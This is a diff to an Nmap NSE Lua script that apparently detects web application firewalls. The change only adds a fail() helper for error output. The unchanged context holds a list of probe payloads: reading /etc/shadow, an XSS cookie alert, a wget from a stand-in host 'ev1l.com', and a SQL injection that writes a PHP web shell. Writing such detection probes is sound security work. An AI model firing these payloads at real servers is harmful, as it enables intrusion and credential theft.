@@ -66,6 +66,8 @@ local attack_vectors_n2 = {"?p4yl04d=cat%20/etc/shadow", "?p4yl04d=id;uname%20-a
                           "?p4yl04d=<img%20src='x'%20onerror=alert(document.cookie)%20/>", "?p4yl04d=wget%20http://ev1l.com/xpl01t.txt",
                           "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php'--"}
 
+local function fail (err) return stdnse.format_output(false, err) end
+
 action = function(host, port)
   local orig_req, tests
   local path = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/"
@@ -79,7 +81,7 @@ action = function(host, port)
   if orig_req.status and orig_req.body then
     stdnse.debug3("Normal HTTP response -> Status:%d Body:\n%s", orig_req.status, orig_req.body)
   else
-    return "[ERROR] Initial HTTP request failed"
+    return fail("Initial HTTP request failed")
   end
   --if aggro mode on, try all vectors
   if aggro then
@@ -97,7 +99,7 @@ action = function(host, port)
   local test_results = http.pipeline_go(host, port, tests)
 
   if test_results == nil then
-    return "[ERROR] HTTP request table is empty. This should not ever happen because we at least made one request."
+    return fail("HTTP request table is empty. This should not ever happen because we at least made one request.")
   end
 
 
